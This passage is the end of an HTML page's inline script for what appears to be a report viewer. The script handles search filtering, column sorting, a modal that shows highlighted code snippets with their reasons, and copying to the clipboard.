document.getElementById('search').addEventListener('input', e=>{ query=e.target.value; render(); });
document.querySelectorAll('thead th').forEach(th=>{ th.addEventListener('click', ()=>{ const k=th.getAttribute('data-key'); if(sortKey===k){ sortDir = sortDir==='asc'?'desc':'asc'; } else { sortKey=k; sortDir='asc'; } render(); }); });
function openModal(it){ const lines = it.snippet_lines || []; let c=''; for(const l of lines){ const h = l.n===it.snippet_focus ? ' hl' : ''; c += '<div class="code-row'+h+'"><span class="ln">'+l.n+'</span><span class="code">'+escapeHtml(l.t)+'</span></div>'; } document.getElementById('code').innerHTML=c; document.getElementById('modal-path').textContent = it.path; document.getElementById('modal-reasons').textContent = (it.reasons||[]).join('; '); document.getElementById('modal').classList.remove('hidden'); }
function closeModal(){ document.getElementById('modal').classList.add('hidden'); }
document.getElementById('rows').addEventListener('click', e=>{ const tr=e.target.closest('tr'); if(!tr) return; const p=tr.getAttribute('data-path'); const it = report.results.find(x=>x.path===p); if(!it) return; openModal(it); });
document.getElementById('close').addEventListener('click', closeModal);
document.getElementById('overlay').addEventListener('click', closeModal);
document.getElementById('copy').addEventListener('click', ()=>{ const txt = Array.from(document.querySelectorAll('.code-row .code')).map(el=>el.textContent).join('\\n'); navigator.clipboard && navigator.clipboard.writeText(txt); });
render();
</script>
</body>
</html>
